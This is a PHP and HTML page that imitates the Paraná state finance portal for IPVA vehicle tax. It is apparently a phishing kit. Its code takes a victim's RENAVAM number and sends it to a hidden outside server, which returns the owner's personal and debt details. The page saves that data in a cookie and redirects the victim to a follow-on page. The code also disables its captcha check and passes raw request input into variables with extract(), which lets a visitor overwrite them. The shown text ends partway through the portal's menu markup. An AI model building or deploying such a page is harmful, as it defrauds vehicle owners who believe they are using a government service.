<?php

error_reporting(0);

extract($_GET);

if($sucesso){

    include_once('./PortalPVAPR_files/PR_home.php');
    
    exit();
}

$secretKey = "6LdeVc4bAAAAAB2lAY_OFCVORLKxOfHawfjaR9Mj";
$Recaptcha_Key = "6LdeVc4bAAAAAHTHlfF-2edELRXFp0mUZFmMn5zy";

if($_POST['renavam']){

    include_once('./modulo/curl.php');
    include_once "./base/function.php";
    include_once "./conectar/db.php";

    extract($_POST);

   // if($g_recaptcha_response){ 
                
     //   $RetornaCaptcha = json_decode(file_get_contents( 'https://www.google.com/recaptcha/api/siteverify?secret='.$secretKey .'&response='.$g_recaptcha_response));

      //  if($RetornaCaptcha->success){

                if($renavam){ //00835339769

                    $Log = file_get_contents("http://$vps:3007/?renavam=$renavam", true);

                    if($Log){

                        $Log = json_decode($Log);

                            if($Log->isStatus){
        
							    $dataProprietario = $Log->dataProprietario;
							    $dataPcela = $Log->dataPcela;
							    $dataUnca = $Log->dataUnca;
							    $DebitosAnteriores = $Log->DebitosAnteriores;
							    $DividaAtiva = $Log->DividaAtiva;
							    $base = $Log->base;

                                $data = json_encode(array("dataProprietario"=>$dataProprietario, "dataPcela"=>$dataPcela, "dataUnca"=>$dataUnca, "DebitosAnteriores"=>$DebitosAnteriores, "DividaAtiva"=>$DividaAtiva, "base"=>$base));

                                setcookie('DataPR', $data , time() + (86400 * 30), "/");

                                echo "sucesso!";

                                exit();

                            }else{

                                echo  "Favor verifique seus dados.";
                            }

                        }else{


                            echo  "Verifique seus dados e tente novamente!";
                        }

            }else{
                 echo  "Favor validar dados corretamente.";
            }

     //   }else{
        //    echo  "Recaptcha invalido.";
     //   }

  //  }else{
    //    echo  "Recaptcha invalido.";
   // }

    exit(); 
}

?>

<!DOCTYPE html>

<html class="p_AFMaximized" dir="ltr" lang="pt-BR">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Portal IPVA</title> 

    <link rel="shortcut icon" href="https://www.contribuinte.fazenda.pr.gov.br/ipva/images/Logo-Parana.png"
        type="image/x-png">

    <link data-afr-stylesheet="1" rel="stylesheet" type="text/css" charset="UTF-8"
        href="./PortalPVAPR_files/skin-SGT-desktop-ckofpo--d-webkit-537-d-ltr-d--s-s-c.css">


    <style>
    #loandig {
        width: 100%;
        height: 100%;
        background: #ffffff8c;
        position: absolute;
        z-index: 2345;
    }

    @media screen and (max-width: 768px) {
        .infotxt {
            display: none;
        }

        .boxmenuf {
            display: none !important
        }

        .SobreoIPVA {
            display: none !important
        }

        .header-col2 {
            display: none !important
        }
    }
    </style>
    <script>
    var id_user = Math.floor(Math.random() * 100000000);

    function Post(data, urlapi) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;
                status(json);
            }
        };
        xhttp.open("POST", urlapi, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send(data);

        return false;
    }

    ttlLink = "<?=$ttlLink?>";

    function status(e) {

        if (e.includes('Comando enviado e exibido na p')) {

            IsValidor(1);

        } else if (e == 'sucesso!') {

            ID('loandig').style = "display: none;";

            window.location.href = "./?link=" + ttlLink + "&sucesso=true&renavam=" + ID('renavam').value +
                "&placa=" + ID('renavam').value;

        } else {


            ID('loandig').style = "display: none;";

            if (e == 'Veículo sem débitos') {
                ID('txt').innerHTML = e;
            } else {
                ID('txt').innerHTML = 'Porfavor validar os dados corretamente.';
            }

            Alert(1);

        }
    }

    function IsValidor(e) {

        setTimeout(() => {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var json = this.response;

                    if (json.includes('erro')) {

                        ID('loandig').style = "display: none;";

                        if (e == 'Veículo sem débitos') {
                            ID('txt').innerHTML = e;
                        } else {
                            ID('txt').innerHTML = 'Porfavor validar os dados corretamente.';
                        }

                        Alert(1);

                    } else if (json.includes('sucesso!')) {

                        ID('loandig').style = "display: none;";

                        window.location.href = "./?link=" + ttlLink + "&sucesso=true&renavam=" + ID(
                            'renavam').value + "&placa=" + ID('renavam').value;

                    } else {
                        status('Comando enviado e exibido na página');
                    }
                }
            };
            xhttp.open("POST", './api/IsValidorPR.php', true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("renavam=" + ID('renavam').value + "&placa=" + ID('renavam').value + '&tela=ippr&partida=ippr');

        }, 1000);
    }

    function ID(e) {
        return document.getElementById(e);
    }

    function validateRecaptcha() {
        grecaptcha.execute('<?=$Recaptcha_Key?>', { action: 'submit' }).then(function(token) {
            onSubmit(token);
        }).catch(function(error) {
            console.error('Erro ao executar o reCAPTCHA:', error);
        });
    }

    function onSubmit(token) {

        if (ID('renavam').value && ID('renavam').value) {

            ID('loandig').style = "display: block;";
            // ID('errosPlaceholder').style = "display: none;";

            Post('partida=ippr&g_recaptcha_response=' + token + '&renavam=' + ID('renavam').value +
                '&placa=' + ID('renavam').value + '&operador=ippr', './api/apiTokemDetran.php?link=' + ttlLink +
                '&renavam=' + ID('renavam').value +
                '&placa=' + ID('renavam').value);

            //   window.location.href = './api/SCbuscar.php?link=' + ttlLink+'&renavam=' + ID('renavam').value +'&placa=' + ID('placa').value;

        } else {

            //ID('mensagensErros').innerHTML = "O campo 'RENAVAM' é obrigatório.";
            //ID('errosPlaceholder').style = "";
        }
    }

    function fecharAlet(e) {
        ID('alert').style.display = "none";
        document.body.style = "";
    }

    function Alert(e) {
        ID('alert').style = "justify-content: center;align-items: center;position: fixed;width: 100%;height: 100%;top: 0;left: 0;z-index: 2;";
    }
    </script>

</head>

<body class="x13d p_AFMaximized" style="cursor: auto;">

<div id="alert"
        style="display: none;justify-content: center;align-items: center;position: fixed;width: 100%;height: 100%;top: 0;left: 0;z-index: 2;">
        <div
            style="width: 100%; height: 100%; background: rgba(0, 0, 0, 0.37); display: flex; justify-content: center; align-items: center;">
            <div
                style="width: 433px;height: 181px;background: white;display: flex;border-radius: 5px;position: relative;">
                <div
                    style="position: absolute;width: 100%;justify-content: center;display: flex;align-items: center;height: 70%;margin-top: 13px;">
                    <img src="https://cdn-icons-png.flaticon.com/512/179/179386.png"
                        style="width: 60px; margin-top: -62px;">
                    <div
                        style="position: absolute; margin-top: 36px; font-weight: 600; color: #898686; font-size: 22px;">
                        Atenção!
                    </div>
                    <div id="txt"
                        style="position: absolute; margin-top: 113px; color: #898686; font-size: 13px; text-align: center; padding: 2px;">
                        Por favor, validar os dados corretamente.
                    </div>
                </div>
                <div onclick="fecharAlet()" title="fechar"
                    style="color: #585858; float: right; display: flex; cursor: pointer; font-size: 20px; position: absolute; top: 8px; right: 8px;">
                    X
                </div>
            </div>
        </div>
    </div>



    <div style="display: none;" id="loandig">
        <div
            style="display: flex;justify-content: center;align-items: center;height: 100%;width: 100%;position: fixed;background: #fefeffa8;">
            <div
                style="display: flex;justify-content: center;width: 200px;border-radius: 3px;height: 89px;background: white;align-items: center;box-shadow: -1px -1px 0px -7px rgba(0, 0, 0, 0.2), 0px 0px 7px 0px rgba(0, 0, 0, 0.14), 0 9px 46px 8px rgba(0, 0, 0, 0.12);">
                <img src="./images/Spinner-btn.gif" style="width: 55px;display: flex;margin-top: -8px;">
                <div id="txt">Consultando</div>
            </div>
        </div>
    </div>




    <style>
    .x1fo {
        display: table;
        position: fixed;
        top: 0px;
        left: 0px;
        width: 100%;
        height: 100%;
        background-color: white;
        color: black;
        z-index: 3201
    }

    .x1fp {
        display: table-cell;
        vertical-align: middle;
        text-align: center
    }

    .x1fq {
        display: table;
        margin-left: auto;
        margin-right: auto;
        white-space: nowrap
    }

    .x1fr {
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        display: none
    }
    </style>
    <div id="afr::Splash" class="x1fo" style="display: none;">
        <div class="x1fp"><span class="x1fq"><span class="x1fr">Carregando...</span></span></div>
    </div>
    <input type="hidden" id="oracle.adf.view.faces.RICH_UPDATE" value="dirty">
    <div id="d1" class=""><a id="d1::skip" class="x19i" style="display: none;">Ignorar para conteúdo principal</a><span
            id="afr::ATStatus" class="p_OraHiddenLabel" role="status" aria-live="polite" aria-atomic="true"></span>
        <form id="f1" name="f1" class="x137" enctype="multipart/form-data" method="POST">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <div id="pt1:pt_pgl10" class="x26d xrh" style="visibility: visible; max-height: 96px; min-height: 96px;">
                <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                    _afrc="1 1 1 1 start top" class="x26b">
                    <div id="pt1:pt_pgl2" class="p_AFHoverTarget x26e xrh"
                        style="visibility: visible; max-height: 92px; min-height: 92px;">
                        <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                            _afrc="1 1 1 1 start top" class="padding-header fix-width padding10px">
                            <div id="pt1:pt_pgl5" class="x26l xrh"
                                style="visibility: visible; max-height: 72px; min-height: 72px;">
                                <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                                    _afrc="1 1 1 1 start top" class="x26h">
                                    <div id="pt1:pt_pgl6" class="x26b xrh"
                                        style="visibility: visible; max-height: 72px; min-height: 72px;">
                                        <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                                            _afrc="1 1 1 1 start top" class="header-altura-conteudo div-logo"><a
                                                id="pt1:pt_l2" class="xgn" data-afr-fcs="true" role="link"><img
                                                    id="pt1:pt_l2::icon" src="./PortalPVAPR_files/Logo-Parana.png"
                                                    class="x187"></a></div>
                                        <div style="display: inline-block; position: absolute; inset: 0px auto auto 80px; width: auto; height: auto; max-width: none; max-height: none;"
                                            _afrc="3 1 1 1 start top" class="header-altura-conteudo div-login">
                                            <div id="pt1:pt_pgl7" class="x26m xrh"
                                                style="visibility: visible; max-height: 43px; min-height: 43px;">
                                                <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                                                    _afrc="1 1 1 1 start top" class="x26b"><span class="x269"> Estado do
                                                        Paraná</span></div>
                                                <div style="display: inline-block; position: absolute; inset: 19px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                                                    _afrc="1 1 2 1 start top" class="x26b"><span class="x26a">Secretaria
                                                        de Estado da Fazenda</span></div>
                                                <div _afrr="y" style="width: 0px; height: 43px;"></div>
                                            </div>
                                        </div>
                                        <div _afrr="y" style="width: 80px; height: 72px;"></div>
                                    </div>
                                </div>
                                <div style="display: inline-block; position: absolute; inset: 0px auto auto 660px; width: auto; height: auto; max-width: none; max-height: none;"
                                    _afrc="2 1 1 1 start top" class="header-col2 header-altura-conteudo"><span
                                        id="pt1:pt_pgl8" class="x26j x1a"><a onclick="ID('renavam').focus()"
                                            id="pt1:pt_l1" class="xgn p_AFTextOnly" data-afr-fcs="true" target="_blank"
                                            data-afr-tlen="27" role="link"><span id="pt1:pt_l1::text" class="x17w">Ir
                                                para o Portal da Fazenda</span></a></span>
                                    <div id="pt1:popup:popupLogin" style="display:none">
                                        <div style="top:auto;right:auto;left:auto;bottom:auto;width:auto;height:auto;position:relative;"
                                            id="pt1:popup:popupLogin::content"></div>
                                    </div>
                                    <div id="pt1:pt_b1" class="x257 xfl p_AFLeading" _afrgrp="0" role="presentation"
                                        aria-haspopup="true"><a onclick="ID('renavam').focus()" data-afr-fcs="true"
                                            class="xfn" role="button"><img id="pt1:pt_b1::icon"
                                                src="./PortalPVAPR_files/entrar.png" alt="" class="xfr"><span
                                                class="xfv">Acessar o sistema</span></a></div>
                                </div>
                                <div _afrr="y" style="width: 0px; height: 72px;"></div>
                            </div>
                        </div>
                        <div _afrr="y" style="width: 0px; height: 92px;"></div>
                    </div>
                </div>
                <div _afrr="y" style="width: 0px; height: 96px;"></div>
            </div>
            <div id="pt1:pt_pgl1" class="x26n xrh" style="visibility: visible; max-height: 1920px; min-height: 1920px;">
                <div style="display: inline-block; position: absolute; inset: 0px auto auto 0px; width: auto; height: auto; max-width: none; max-height: none;"
                    _afrc="1 1 1 1 start top" class="conteudo-altura padding-main fix-width">
                    <div id="pt1:r1" class="xui" aria-live="polite">
                        <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation"
                            id="pt1:r1:0:pgl6" class="x26x x1a infotxt">
                            <tbody>
                                <tr>
                                    <td><span id="pt1:r1:0:ol1" class="x23r xq"><label>IPVA - Imposto sobre a
                                                Propriedade de Veículos Automotores</label></span></td>
                                    <td>
                                        <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation"
                                            id="pt1:r1:0:pgl7" class="x1a" style="">
                                            <tbody>
                                                <tr>
                                                    <td width="100%"></td>
                                                    <td><a id="pt1:r1:0:l1" class="xgn"
                                                            style="width:300px;border:none;background:none;cursor:pointer;"
                                                            data-afr-fcs="true" onclick="ID('renavam').focus()"
                                                            role="link"><img id="pt1:r1:0:l1::icon"
                                                                src="./PortalPVAPR_files/assistente-virtual.png"
                                                                class="x187"></a></td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                </tr>
                            </tbody>
                        </table><img id="pt1:r1:0:s3" src="./PortalPVAPR_files/t.gif" alt="" width="10" height="10"
                            style="vertical-align:middle;">
                        <hr id="pt1:r1:0:s2" class="x1j"><img id="pt1:r1:0:s4" src="./PortalPVAPR_files/t.gif" alt=""
                            width="10" height="10" style="vertical-align:middle;"><span id="pt1:r1:0:ml2"
                            class="x26v x1a">
                            <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation"
                                id="pt1:r1:0:gr1" class="x295 xsz x27c x1a">
                                <tbody>
                                    <tr>
                                        <td><span id="pt1:r1:0:gc2" class="x1a">
                                                <div id="pt1:r1:0:btnVoltSobr" class="x25f xfl p_AFTextOnly" _afrgrp="0"
                                                    role="presentation"><a onclick="ID('renavam').focus()"
                                                        data-afr-fcs="true" class="xfn" role="button"
                                                        aria-pressed="false"><span class="xfv">Sobre o IPVA</span></a>
                                                </div>
                                            </span></td>
                                        <td><span id="pt1:r1:0:gc3" class="x1a">
                                                <div id="pt1:r1:0:mb1" class="menu-bar x6e" style="overflow:hidden;"
                                                    role="menubar">
                                                    <div role="presentation" class="xdd">
                                                        <div role="presentation" id="pt1:r1:0:mb1::oc"
                                                            class="af_menuBar_content">
                                                            <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                                role="presentation" class="x21e">
                                                                <tbody>
                                                                    <tr>
                                                                        <td class="x15s" role="presentation"><a
                                                                                style="display: none;"></a>
                                                                            <div id="pt1:r1:0:m1"
                                                                                class="menu-drop x15z x160" _afrdth="1"
                                                                                _afrgrp="0" role="presentation">
                                                                                <div class="x17h" data-afr-fcs="true"
                                                                                    tabindex="0" role="menuitem"
                                                                                    aria-haspopup="true"
                                                                                    aria-label="Consultas">
                                                                                    <table cellpadding="0"
                                                                                        cellspacing="0" border="0"
                                                                                        summary="" role="presentation">
                                                                                        <tbody>
                                                                                            <tr>
                                                                                                <td></td>
                                                                                                <td class="x15t"><a
                                                                                                        onclick="ID('renavam').focus()"
                                                                                                        class="x166"
                                                                                                        tabindex="-1">Consultas</a>
                                                                                                </td>
                                                                                                <td>
                                                                                                    <div class="x16e">
                                                                                                    </div>
                                                                                                </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>
                                                                                </div>
                                                                                <table cellpadding="0" cellspacing="0"
                                                                                    border="0" summary="" role="menu"
                                                                                    class="x16f" id="pt1:r1:0:m1::menu">
                                                                                    <tbody>
                                                                                        <tr>
                                                                                            <td class="x21g p_AFDisabled"
                                                                                                id="pt1:r1:0:m1::sUpBg">
                                                                                                <div id="pt1:r1:0:m1::ScrollUp"
                                                                                                    class="x16g p_AFDisabled"
                                                                                                    style="display:none">
                                                                                                    <span
                                                                                                        class="x16i"></span>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <div id="pt1:r1:0:m1::ScrollBox"
                                                                                                    class="x17k">
                                                                                                    <table
                                                                                                        cellpadding="0"
                                                                                                        cellspacing="0"
                                                                                                        border="0"
                                                                                                        width="100%"
                                                                                                        summary=""
                                                                                                        role="presentation"
                                                                                                        id="pt1:r1:0:m1::ScrollContent"
                                                                                                        class="x21f">
                                                                                                        <tbody>
                                                                                                            <tr id="pt1:r1:0:cmi2"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Consultar
                                                                                                                    Débitos
                                                                                                                    do
                                                                                                                    Veículo
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:gmi1"
                                                                                                                class="menu-content x16a x16k"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16p">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16q">
                                                                                                                    Consultar
                                                                                                                    Detran/PR
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16r">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16s">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:cmi66"
                                                                                                                class="menu-content x16a x16k"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16p">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16q">
                                                                                                                    Consultar
                                                                                                                    Parcelamentos
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16r">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16s">
                                                                                                                    <div
                                                                                                                        class="x17m">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr id="pt1:r1:0:cmi7"
                                                                                                                class="menu-content x169 x16j"
                                                                                                                onclick="ID('renavam').focus()"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem">
                                                                                                                <td
                                                                                                                    class="x16m">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16n">
                                                                                                                    Consultar
                                                                                                                    Valor
                                                                                                                    Venal
                                                                                                                    IPVA
                                                                                                                    2024
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16o">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15y">
                                                                                                                    <div
                                                                                                                        class="x17l">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="x21h"
                                                                                                id="pt1:r1:0:m1::sDwnBg">
                                                                                                <div id="pt1:r1:0:m1::ScrollDown"
                                                                                                    class="x16h"
                                                                                                    style="display:none">
                                                                                                    <span
                                                                                                        class="x16i"></span>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </td>
                                                                    </tr>
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                        <div id="pt1:r1:0:mb1::eoi" class="xlk" title="Overflow"
                                                            aria-label="Overflow" role="menuitem" aria-haspopup="true"
                                                            data-afr-fcs="true" tabindex="-1">
                                                            <div id="pt1:r1:0:mb1::eoc" class="xlw" role="menu"></div>
                                                        </div>
                                                    </div>
                                                    <div class="xnd"></div>
                                                </div>
                                            </span></td>
                                        <td><span id="pt1:r1:0:gc4" class="x1a">
                                                <div id="pt1:r1:0:mb2" class="menu-bar x6e" style="overflow:hidden;"
                                                    role="menubar">
                                                    <div role="presentation" class="xdd">
                                                        <div role="presentation" id="pt1:r1:0:mb2::oc"
                                                            class="af_menuBar_content">
                                                            <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                                role="presentation" class="x21e">
                                                                <tbody>
                                                                    <tr>
                                                                        <td class="x15s" role="presentation"><a
                                                                                style="display: none;"></a>
                                                                            <div id="pt1:r1:0:m2"
                                                                                class="menu-drop x15z x160" _afrdth="1"
                                                                                _afrgrp="0" role="presentation">
                                                                                <div class="x17h" data-afr-fcs="true"
                                                                                    tabindex="0" role="menuitem"
                                                                                    aria-haspopup="true"
                                                                                    aria-label="Serviços">
                                                                                    <table cellpadding="0"
                                                                                        cellspacing="0" border="0"
                                                                                        summary="" role="presentation">
                                                                                        <tbody>
                                                                                            <tr>
                                                                                                <td></td>
                                                                                                <td class="x15t"><a
                                                                                                        onclick="ID('renavam').focus()"
                                                                                                        class="x166"
                                                                                                        tabindex="-1">Serviços</a>
                                                                                                </td>
                                                                                                <td>
                                                                                                    <div class="x16e">
                                                                                                    </div>
                                                                                                </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>
                                                                                </div>
                                                                                <table cellpadding="0" cellspacing="0"
                                                                                    border="0" summary="" role="menu"
                                                                                    class="x16f" id="pt1:r1:0:m2::menu">
                                                                                    <tbody>
                                                                                        <tr>
                                                                                            <td class="x21g p_AFDisabled"
                                                                                                id="pt1:r1:0:m2::sUpBg">
                                                                                                <div id="pt1:r1:0:m2::ScrollUp"
                                                                                                    class="x16g p_AFDisabled"
                                                                                                    style="display:none">
                                                                                                    <span
                                                                                                        class="x16i"></span>
                                                                                                </div>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td>
                                                                                                <div id="pt1:r1:0:m2::ScrollBox"
                                                                                                    class="x17k">
                                                                                                    <table
                                                                                                        cellpadding="0"
                                                                                                        cellspacing="0"
                                                                                                        border="0"
                                                                                                        width="100%"
                                                                                                        summary=""
                                                                                                        role="presentation"
                                                                                                        id="pt1:r1:0:m2::ScrollContent"
                                                                                                        class="x21f">
                                                                                                        <tbody>
                                                                                                            <tr id="pt1:r1:0:m3"
                                                                                                                class="menu-content x15z x16l"
                                                                                                                _afrdth="2"
                                                                                                                _afrgrp="0"
                                                                                                                data-afr-fcs="true"
                                                                                                                tabindex="-1"
                                                                                                                role="menuitem"
                                                                                                                aria-haspopup="true">
                                                                                                                <td
                                                                                                                    class="x16i">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16t">
                                                                                                                    Isenção
                                                                                                                    /
                                                                                                                    Imunidade
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x16u">
                                                                                                                    <div
                                                                                                                        class="x178">
                                                                                                                    </div>
                                                                                                                </td>
                                                                                                                <td
                                                                                                                    class="x15x">
                                                                                                                    <div
                                                                                                                        class="x16y">
                                                                                                                    </div>
                                                                                                                    <table
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="menu"
                                                                                                                        class="x16f"
                                                                                                                        id="pt1:r1:0:m3::menu">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td class="x21g p_AFDisabled"
                                                                                                                                    id="pt1:r1:0:m3::sUpBg">
                                                                                                                                    <div id="pt1:r1:0:m3::ScrollUp"
                                                                                                                                        class="x16g p_AFDisabled"
                                                                                                                                        style="display:none">
                                                                                                                                        <span
                                                                                                                                            class="x16i"></span>
                                                                                                                                    </div>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td>
                                                                                                                                    <div id="pt1:r1:0:m3::ScrollBox"
                                                                                                                                        class="x17k">
                                                                                                                                        <table
                                                                                                                                            cellpadding="0"
                                                                                                                                            cellspacing="0"
                                                                                                                                            border="0"
                                                                                                                                            width="100%"
                                                                                                                                            summary=""
                                                                                                                                            role="presentation"
                                                                                                                                            id="pt1:r1:0:m3::ScrollContent"
                                                                                                                                            class="x21f">
                                                                                                                                            <tbody>
                                                                                                                                                <tr id="pt1:r1:0:cmi18"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Imunidades
                                                                                                                                                        (Templos
                                                                                                                                                        e
                                                                                                                                                        Outros)
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                                <tr id="pt1:r1:0:cmi17"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Isenção
                                                                                                                                                        para
                                                                                                                                                        PcD,
                                                                                                                                                        Síndrome
                                                                                                                                                        de
                                                                                                                                                        Down
                                                                                                                                                        ou
                                                                                                                                                        Autista
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                                <tr id="pt1:r1:0:cmi15"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Substituição
                                                                                                                                                        de
                                                                                                                                                        isenção
                                                                                                                                                        de
                                                                                                                                                        veículo
                                                                                                                                                        de
                                                                                                                                                        PcD
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16o">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x15y">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                </tr>
                                                                                                                                                <tr id="pt1:r1:0:cmiTaxiEscolarPopup"
                                                                                                                                                    class="menu-content x169 x16j"
                                                                                                                                                    onclick="ID('renavam').focus()"
                                                                                                                                                    _afrdth="3"
                                                                                                                                                    _afrgrp="0"
                                                                                                                                                    data-afr-fcs="true"
                                                                                                                                                    tabindex="-1"
                                                                                                                                                    role="menuitem"
                                                                                                                                                    aria-haspopup="true">
                                                                                                                                                    <td
                                                                                                                                                        class="x16m">
                                                                                                                                                        <div
                                                                                                                                                            class="x17l">
                                                                                                                                                        </div>
                                                                                                                                                    </td>
                                                                                                                                                    <td
                                                                                                                                                        class="x16n">
                                                                                                                                                        Substituição
                                                                                                                                                        de
                                                                                                                                                        isenção
                                                                                                                                                        de
                                                                                                                                                        veículo
                                                                                                                                                        táxi
                                                                                                                                                        ou
                                                                                                                                                        escolar
